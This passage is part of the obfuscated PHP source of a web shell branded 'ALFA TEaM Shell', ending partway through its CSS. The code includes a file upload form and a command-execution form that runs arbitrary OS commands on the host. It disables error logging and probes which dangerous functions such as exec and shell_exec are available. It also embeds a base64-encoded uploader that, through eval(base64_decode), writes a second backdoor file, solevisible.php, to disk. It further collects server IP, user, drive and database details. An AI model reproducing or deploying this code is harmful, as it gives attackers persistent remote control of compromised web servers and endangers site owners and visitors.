echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
echo "<b style='color: #7CFC00'>Safe Mode : $yxarqqmp4b43b0aee35624cd95b910189b3dc231<br>";
echo"<font color=#7CFC00>Disable functions : </font>";
$seoudwvg0b30ee767bb8b426744976e10337f56e = @ini_get('disable_functions');
if(empty($seoudwvg0b30ee767bb8b426744976e10337f56e)){$seoudwvg0b30ee767bb8b426744976e10337f56e = '<font color="green">NONE</font>';}
echo"<font color=red>";
echo "$seoudwvg0b30ee767bb8b426744976e10337f56e";
echo"</font><br>";
echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@alfaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
if(isset($_FILES['file'])){
if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
}
echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.value = btoa(unescape(encodeURIComponent(this.command_solevisible.value)));" method="POST">Execute Command: <input name="command_solevisible" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
<hr><pre>';
if(isset($_POST['command_solevisible'])){
if(strtolower(substr(PHP_OS,0,3))=="win")$wkncvkwsa0f0bc95016c862498bbad29d1f4d9d4='&';else $wkncvkwsa0f0bc95016c862498bbad29d1f4d9d4=';';
$syosrpmxd4a590caacc0be55ef286e40a945ea45 = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$wkncvkwsa0f0bc95016c862498bbad29d1f4d9d4."".__ZGVjb2Rlcg($_POST['command_solevisible']);
echo alfaEx($syosrpmxd4a590caacc0be55ef286e40a945ea45);
}
echo'</pre>
</body></html>';
exit;}
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('magic_quotes_runtime', 0);
@set_time_limit(0);
if(function_exists('set_magic_quotes_runtime')){
@set_magic_quotes_runtime(0);
}
foreach($_POST as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
if(is_array($_POST[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d])){
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0;
foreach($_POST[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7) {
$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = trim(str_replace(' ', '+',$npviloqa8fa14cdd754f91cc6554c9e71929cce7));
$_POST[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d][$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] = decrypt_post($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;
}
}else{
$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = trim(str_replace(' ', '+',$rkptsoeg2063c1608d6e0baf80249c42e2be5804));
$_POST[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] = decrypt_post($rkptsoeg2063c1608d6e0baf80249c42e2be5804);
}
}
$qsvrxdva707d47ef3e8b55054789cb477a5e0c0f = 'FilesMan2';//'FilesMan';
$kcthqfwp9460f24199513932be5ce352f337ace0 = true;
$awvrbpxm7ca54e47c6413ba02f536119d50d38bd = 'Windows-1251';
if(strtolower(substr(PHP_OS,0,3))=="win")
$GLOBALS['sys']='win';
else
$GLOBALS['sys']='unix';
$GLOBALS['home_cwd'] = @alfaGetCwd();
$GLOBALS["need_to_update_header"] = "false";
$GLOBALS['glob_chdir_false'] = false;
if(isset($_POST['c'])){
if(!@chdir($_POST['c'])){
	$GLOBALS['glob_chdir_false'] = true;
}
}
$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@alfaGetCwd());
if($GLOBALS['glob_chdir_false']){
	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @alfaGetCwd());
}
if($GLOBALS['sys'] == 'win'){
$GLOBALS['home_cwd'] = str_replace("\\", "/", $GLOBALS['home_cwd']);
$GLOBALS['cwd'] = str_replace("\\", "/", $GLOBALS['cwd']);
}
if($GLOBALS['cwd'][strlen($GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $rmfooptx8004212c372da90114957b5f2acd47ef) {if ($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = getenv($rmfooptx8004212c372da90114957b5f2acd47ef)) {return $dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f;}}$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = tempnam($GLOBALS['__file_path'], '');if (_alfa_file_exists($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f,false)) {unlink($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f);return dirname($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f);}return null;}}
if(!function_exists("mb_strlen")){
	function mb_strlen($okjeiabf341be97d9aff90c9978347f66f945b77, $yyphbkaj4a8a08f09d37b73795649038408b5f33=""){
		return strlen($okjeiabf341be97d9aff90c9978347f66f945b77);
	}
}
if(!function_exists("mb_substr")){
	function mb_substr($okjeiabf341be97d9aff90c9978347f66f945b77, $lshuoojwea2b2676c28c0db26d39331a336c6b92, $qahbjcwq7f021a1415b86f2d013b2618fb31ae53, $yyphbkaj4a8a08f09d37b73795649038408b5f33=""){
		return substr($okjeiabf341be97d9aff90c9978347f66f945b77, $lshuoojwea2b2676c28c0db26d39331a336c6b92, $qahbjcwq7f021a1415b86f2d013b2618fb31ae53);
	}
}
define("ALFA_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
function alfahead(){
$GLOBALS['__ALFA_SHELL_CODE'] = 'PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+';
$djgefzabfa291e147a24773b9932f4c6f05746d3 = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
define("ALFA_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($djgefzabfa291e147a24773b9932f4c6f05746d3)."'))");
if(!isset($_POST['ajax'])){
function Alfa_GetDisable_Function(){
$seoudwvg0b30ee767bb8b426744976e10337f56e = @ini_get('disable_functions');
$bqvpaqdadcf5500c7e53721d4b016e4793d5dd66 = '<span class="header_show_all">All Functions Accessible</span>';
if(empty($seoudwvg0b30ee767bb8b426744976e10337f56e))return($bqvpaqdadcf5500c7e53721d4b016e4793d5dd66);
$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = explode(',',$seoudwvg0b30ee767bb8b426744976e10337f56e);
$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = array_unique($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0;
$aospafqz92eb5ffee6ae2fec3ad71c777531578f=0;
$uhkponec7df4935f4a5a2865191ef74f64df8754 = array('system','exec','shell_exec','proc_open','popen','passthru','symlink','dl');
$vodjcxqx9729522c086a8f36e30ec6b23b410aa7 = array();
$uzlrkegm6defe7a7a9ad85b49099b7e6e3668bc6 = array();
foreach($fwekvgvg03c7c0ace395d80182db07ae2c30f034 as $iwxbtdws8277e0910d750195b448797616e091ad){
	$iwxbtdws8277e0910d750195b448797616e091ad=trim($iwxbtdws8277e0910d750195b448797616e091ad);
	if(empty($iwxbtdws8277e0910d750195b448797616e091ad)||!is_callable($iwxbtdws8277e0910d750195b448797616e091ad))continue;
	if(!function_exists($iwxbtdws8277e0910d750195b448797616e091ad)){
		if(in_array($iwxbtdws8277e0910d750195b448797616e091ad,$uhkponec7df4935f4a5a2865191ef74f64df8754)){
			$pkzgtivg4cdf5a25d4673bfc4546ca7843071f65 .= $iwxbtdws8277e0910d750195b448797616e091ad." | ";$aospafqz92eb5ffee6ae2fec3ad71c777531578f++;
			$vodjcxqx9729522c086a8f36e30ec6b23b410aa7[] = $iwxbtdws8277e0910d750195b448797616e091ad;
		}else{
			$uzlrkegm6defe7a7a9ad85b49099b7e6e3668bc6[] = $iwxbtdws8277e0910d750195b448797616e091ad;
		}
		$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;
	}
}
if($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741==0)return($bqvpaqdadcf5500c7e53721d4b016e4793d5dd66);
if($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 <= count($uhkponec7df4935f4a5a2865191ef74f64df8754)){
$qcsrkruna181a603769c1f98ad927e7367c7aa51 = array_values(array_merge($vodjcxqx9729522c086a8f36e30ec6b23b410aa7, $uzlrkegm6defe7a7a9ad85b49099b7e6e3668bc6));
return('<span class="disable_functions">'.implode(" | ", $qcsrkruna181a603769c1f98ad927e7367c7aa51).'</span>');
}
return('<span class="disable_functions">'.$pkzgtivg4cdf5a25d4673bfc4546ca7843071f65.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="alfa_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741.')</span></a>');
}
function AlfaNum(){
$dnqkqniqa956af09162870af6ce4ebe0f12ccaf8 = func_get_args();
$niytpinla6c6dd28743c140aa4aa98c4669eea39 = array();
$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = array();
for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=10;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
$niytpinla6c6dd28743c140aa4aa98c4669eea39[] = $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741;
}
foreach($dnqkqniqa956af09162870af6ce4ebe0f12ccaf8 as $mcpievhm61dd86c2dc75c3f569ec619bd283a33f){
$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4[] = $mcpievhm61dd86c2dc75c3f569ec619bd283a33f;
}
echo '<script>';
foreach($niytpinla6c6dd28743c140aa4aa98c4669eea39 as $rpatbarj56aed7e7485ff03d5605b885b86e947e){
if(in_array($rpatbarj56aed7e7485ff03d5605b885b86e947e,$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4))
continue;
echo 'alfa'.$rpatbarj56aed7e7485ff03d5605b885b86e947e."_=";
}
echo '""</script>';
}
if(empty($_POST['charset']))
$_POST['charset'] = $GLOBALS['default_charset'];
$umbdwmvqa9cc6a00f8695708b1579c7988207667 = function_exists('diskfreespace')?@diskfreespace($GLOBALS['cwd']):'?';
$irtldmrodb28f3b2aefa09d63dcd57583254de71 = function_exists('disk_total_space')?@disk_total_space($GLOBALS['cwd']):'?';
$irtldmrodb28f3b2aefa09d63dcd57583254de71 = $irtldmrodb28f3b2aefa09d63dcd57583254de71?$irtldmrodb28f3b2aefa09d63dcd57583254de71:1;
$kvinbkgied2b5c0139cec8ad2873829dc1117d50="<span class='header_on'> ON </span>";
$xgirxeia8bf8854bebe108183caeb845c7676ae4="<span class='header_off'> OFF </span>";
$axfemcil334c4a4c42fdb79d7ebc3e73b517e6f8="<span class='header_none'> NONE </span>";
if(function_exists('ssh2_connect'))
$njiaostw1eb174fa332c502d2b4929d74e5d1d64=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
else
$njiaostw1eb174fa332c502d2b4929d74e5d1d64=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
if(function_exists('curl_version'))
$qqhrnrcwf6e57c9de709e45feb0d955351f53548=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
else
$qqhrnrcwf6e57c9de709e45feb0d955351f53548=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
if(function_exists('mysql_get_client_info')||class_exists('mysqli'))
$uadvcujo81c3b080dad537de7e10e0987a4bf52e=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
else
$uadvcujo81c3b080dad537de7e10e0987a4bf52e=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
if(function_exists('mssql_connect'))
$dffrmfjea0589ddd20d56ac0fd4c8f1c83177672=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
else
$dffrmfjea0589ddd20d56ac0fd4c8f1c83177672=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
if(function_exists('pg_connect'))
$viobjnle235ec52392b77977539cf78b62e708d3=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
else
$viobjnle235ec52392b77977539cf78b62e708d3=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
if(function_exists('oci_connect'))
$okougdode81c4e4f2b7b93b481e13a8553c2ae1b=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
else
$okougdode81c4e4f2b7b93b481e13a8553c2ae1b=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
if(@ini_get('disable_functions'))
$seoudwvg0b30ee767bb8b426744976e10337f56e=@ini_get('disable_functions');
else
$seoudwvg0b30ee767bb8b426744976e10337f56e="All Functions Enable";
if(@ini_get('safe_mode'))
$dcwnlocgd27c87d911f030008cce9ab55024113f="<span class='header_off'>ON</span>";
else
$dcwnlocgd27c87d911f030008cce9ab55024113f="<span class='header_on'>OFF</span>";
$yowbntez96b22492d937bc3ace31d0abe38ba66d="<span class='header_off' id='header_cgishell'>OFF</span>";
if(@ini_get('open_basedir')){
$qduadmup6edc515a5ce032f7b1b7260406bca1ed = @ini_get('open_basedir');
if(strlen($qduadmup6edc515a5ce032f7b1b7260406bca1ed)>120){
$reeyunzd5289df8a8663eeaea5de3baad848212d=substr($qduadmup6edc515a5ce032f7b1b7260406bca1ed,0, 120)."...";
}else{
$reeyunzd5289df8a8663eeaea5de3baad848212d = $qduadmup6edc515a5ce032f7b1b7260406bca1ed;
}
}else{$reeyunzd5289df8a8663eeaea5de3baad848212d=$axfemcil334c4a4c42fdb79d7ebc3e73b517e6f8;}
if(@ini_get('safe_mode_exec_dir'))
$iajnyxqb4c128155fac3a64697dbf1e7f69fa16d=@ini_get('safe_mode_exec_dir');
else
$iajnyxqb4c128155fac3a64697dbf1e7f69fa16d=$axfemcil334c4a4c42fdb79d7ebc3e73b517e6f8;
if(@ini_get('safe_mode_include_dir'))
$kodnhifb3fc7c001fae08c7c5462a0aa84e0edc0=@ini_get('safe_mode_include_dir');
else
$kodnhifb3fc7c001fae08c7c5462a0aa84e0edc0=$axfemcil334c4a4c42fdb79d7ebc3e73b517e6f8;
if(!function_exists('posix_getegid'))
{
$eeodyzriee11cbb19052e40b07aac0ca060c23ee = function_exists("get_current_user")?@get_current_user():"????";
$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = function_exists("getmyuid")?@getmyuid():"????";
$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c = function_exists("getmygid")?@getmygid():"????";
$btxspfltdb0f6f37ebeb6ea09489124345af2a45 = "?";
}else{
$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = function_exists("posix_getpwuid")&&function_exists("posix_geteuid")?@posix_getpwuid(posix_geteuid()):array("name"=>"????", "uid"=>"????");
$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c = function_exists("posix_getgrgid")&&function_exists("posix_getegid")?@posix_getgrgid(posix_getegid()):array("name"=>"????", "gid"=>"????");
$eeodyzriee11cbb19052e40b07aac0ca060c23ee = $uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'];
$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = $uwdmfmmt9871d3a2c554b27151cacf1422eec048['uid'];
$btxspfltdb0f6f37ebeb6ea09489124345af2a45 = $zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'];
$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c = $zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['gid'];
}
$eimuvpaae95018b624f00c5735c8baacde05f940 = '';
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = explode("/", $GLOBALS['cwd']);
$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1=count($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1-1; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++) {
$eimuvpaae95018b624f00c5735c8baacde05f940 .= "<a class='header_pwd' onclick='g(\"FilesMan\",\"";
$fyhgtfyjb2f07bf8576cc7ca7aa908c21721386b = "";
for($zvhlbqna363b122c528f54df4a0446b6bab05515=0; $zvhlbqna363b122c528f54df4a0446b6bab05515<=$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741; $zvhlbqna363b122c528f54df4a0446b6bab05515++){
$eimuvpaae95018b624f00c5735c8baacde05f940 .= $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485[$zvhlbqna363b122c528f54df4a0446b6bab05515].'/';
$fyhgtfyjb2f07bf8576cc7ca7aa908c21721386b .= $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485[$zvhlbqna363b122c528f54df4a0446b6bab05515].'/';
}
$eimuvpaae95018b624f00c5735c8baacde05f940 .= "\")' path='".$fyhgtfyjb2f07bf8576cc7ca7aa908c21721386b."' href='#action=fileman&path=".$fyhgtfyjb2f07bf8576cc7ca7aa908c21721386b."'>".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]."/</a>";
}
$ykqnkwvw2b764bafdbf32ae530608c3ff8b2fd3b = "";
foreach(range('a','z') as $wycalxbf4aa1e7414849577e6d4c076c08782d3a)
if(@is_dir($wycalxbf4aa1e7414849577e6d4c076c08782d3a.':\\'))
$ykqnkwvw2b764bafdbf32ae530608c3ff8b2fd3b .= '<a href="javascript:void(0);" class="header_drive" onclick="g(\'FilesMan\',\''.$wycalxbf4aa1e7414849577e6d4c076c08782d3a.':/\')">[ '.$wycalxbf4aa1e7414849577e6d4c076c08782d3a.' ]</a> ';
$znvaonll8c039c80621a8d6636f1b6d0998e4e3d ='	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;';
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
<link href="'.__showicon('alfamini').'" rel="icon" type="image/x-icon"/>
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
.hlabale{color:#67abdf;border-radius:4px;border:1px solid #27979b;margin-left:7px;padding:2px}#tbl_sympphp tr{text-align:center}#PhpCode,.php-evals-ace,.view_ml_content{position:absolute;top:0;right:0;bottom:0;left:0;background:#1b292b26;top:50px}.editor-view{position:relative;height:100%}.view-content{position:absolute;overflow-y:auto;width:100%;height:93%}::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:10px;background-color:#000115}::-webkit-scrollbar{width:10px;background-color:#000115}::-webkit-scrollbar-thumb{border-radius:10px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#1e82b5}.editor-file-name{margin-left:29px;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.editor-icon{position:absolute}.is_active{background:rgba(49,55,93,.77);border-radius:10px}.history-list{height:88%;overflow-y:auto}.opt-title{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);color:#2fd051;font-size:25px;font-family:monospace}.options_min_badge{visibility:hidden;text-align:center;right:30px;color:#fff;background:#2a8a24;padding:6px;border-radius:50%;width:15px;height:15px;display:inline-block;position:absolute;top:-7px}#cgiloader-minimized,#database_window-minimized,#editor-minimized,#options_window-minimized{display:block;position:fixed;right:-30px;width:30px;height:30px;top:30%;z-index:9999}.minimized-wrapper{position:relative;background:#0e304a;width:44px;height:130px;cursor:pointer;border-bottom-left-radius:5px;border-top-left-radius:5px}.minimized-text{transform:rotate(-90deg);color:wheat;font-size:x-large;display:inline-block;position:absolute;right:-51px;width:129px;top:-10px;border-top-left-radius:4%;height:56px;padding:3px}.close-button,.editor-minimize{height:26px;width:38px;right:7px;background:#1d5673;cursor:pointer;position:absolute;box-sizing:border-box;line-height:50px;display:inline-block;top:17px;border-radius:100px}.editor-minimize{right:50px}.close-button:after,.close-button:before,.editor-minimize:before{transform:rotate(-45deg);content:"";position:absolute;top:63%;right:6px;margin-top:-5px;margin-left:-25px;display:block;height:4px;width:27px;background-color:rgba(216,207,207,.75);transition:all .25s ease-out}.editor-minimize:before{transform:rotate(0)}.close-button:after{transform:rotate(-135deg)}.close-button:hover:after,.close-button:hover:before,.editor-minimize:hover:before{background-color:red}.close-button:hover,.editor-minimize:hover{background-color:rgba(39,66,80,.96)}#cgiloader,#database_window,#editor,#options_window{display:none;position:fixed;top:0;width:100%;height:100%;z-index:20}.editor-wrapper{width:100%;height:100%;position:relative;top:1%}.editor-header{width:97%;background:rgba(21,66,88,.93);height:37px;margin-left:13px;position:relative;border-top-left-radius:15px;border-top-right-radius:15px}.editor-path{position:absolute;font-size:x-large;margin-left:10px;top:6px;color:#00ff7f}.editor-modal{position:relative;top:0;background-color:rgba(0,1,23,.95);height:90%;margin-left:20%;margin-right:2%;border:2px #0e304a solid}.editor-explorer{width:19%;height:90%;background-color:rgba(0,1,23,.94);position:absolute;z-index:2;left:1%;border:2px #0e304a solid}.editor-controller{position:relative;top:-13px}.file-holder{position:relative;width:100%;height:30px}.file-holder>.history{position:absolute;color:#03b3a3;cursor:pointer;left:5px;font-size:18px;font-family:sans-serif;width:89%;height:100%;z-index:3;border-radius:10px;transition:background-color .6s ease-out}.file-holder>.history-close{display:block;opacity:0;position:absolute;right:2px;width:20px;top:4px;text-align:center;cursor:pointer;color:#fff;background:red;border-radius:100px;font-family:monospace;z-index:10;transition:opacity .6s ease-out;font-size:15px;height:19px}.file-holder>.history:hover{background-color:#646464}.editor-explorer>.hheader{position:relative;color:#14ff07;border-bottom:2px #206aa2 solid;text-align:center;font-family:sans-serif;margin-bottom:10px;height:55px}.editor-search{position:absolute;bottom:7px;left:31px}.hheader-text{position:absolute;left:8px;top:2px}.history-clear{position:absolute;right:8px;top:2px;cursor:pointer}.editor-body{position:relative;margin-left:3px;height:100%}.editor-anim-close{-webkit-animation:editorClose .8s ease-in-out forwards;-moz-animation:editorClose .8s ease-in-out forwards;-ms-animation:editorClose .8s ease-in-out forwards;animation:editorClose .8s ease-in-out forwards}@keyframes editorClose{0%{visibility:1;opacity:1}100%{visibility:0;opacity:0}}.editor-anim-minimize{-webkit-animation:editorMinimize .8s ease-in-out forwards;-moz-animation:editorMinimize .8s ease-in-out forwards;-ms-animation:editorMinimize .8s ease-in-out forwards;animation:editorMinimize .8s ease-in-out forwards}@keyframes editorMinimize{0%{right:0;opacity:1}100%{right:-2000px;opacity:0}}.editor-anim-show{-webkit-animation:editorShow .8s ease-in-out forwards;-moz-animation:editorShow .8s ease-in-out forwards;-ms-animation:editorShow .8s ease-in-out forwards;animation:editorShow .8s ease-in-out forwards}@keyframes editorShow{0%{right:-2000px;opacity:0}100%{right:0;opacity:1}}.minimized-show{-webkit-animation:minimizeShow .8s ease-in-out forwards;-moz-animation:minimizeShow .8s ease-in-out forwards;-ms-animation:minimizeShow .8s ease-in-out forwards;animation:minimizeShow .8s ease-in-out forwards}@keyframes minimizeShow{0%{right:-30px;opacity:0}100%{right:0;opacity:1}}.minimized-hide{-webkit-animation:minimizeHide .8s ease-in-out forwards;-moz-animation:minimizeHide .8s ease-in-out forwards;-ms-animation:minimizeHide .8s ease-in-out forwards;animation:minimizeHide .8s ease-in-out forwards}@keyframes minimizeHide{0%{right:0;opacity:1}100%{right:-30px;opacity:0}}.solevisible-text:hover{-webkit-text-shadow:0 0 25px #0f0;-moz-text-shadow:0 0 25px #0f0;-ms-text-shadow:0 0 25px #0f0;text-shadow:0 0 25px #0f0}.update-holder{position:fixed;top:0;background-color:rgba(0,24,29,.72);width:100%;height:100%}.update-content{position:relative}.update-content>a{text-decoration:none;position:absolute;color:rgba(103,167,47,.77);left:24%;margin-top:7%;font-size:40px}.update-close{position:absolute;right:0;margin-right:23px;top:10px;font-size:27px;background-color:#130f50;width:5%;border-radius:100px;cursor:pointer;border:2px #0e265a solid}.update-close:hover{border:2px #25ff00 solid;color:red}.filestools{height:auto;width:auto;color:#67abdf;font-size:12px;font-family:Verdana,Geneva,sans-serif}@-moz-document url-prefix(){#search-input{width:173px}.editor-path{top:3px}}.filters-holder{padding:5px;padding-left:10px}.filters-holder input{width:200px}.filters-holder span{color:#8bc7f7}#rightclick_menu{width:175px;visibility:hidden;opacity:0;position:fixed;background:#0f304a;color:#555;font-family:sans-serif;font-size:11px;-webkit-transition:opacity .5s ease-in-out;-moz-transition:opacity .5s ease-in-out;-ms-transition:opacity .5s 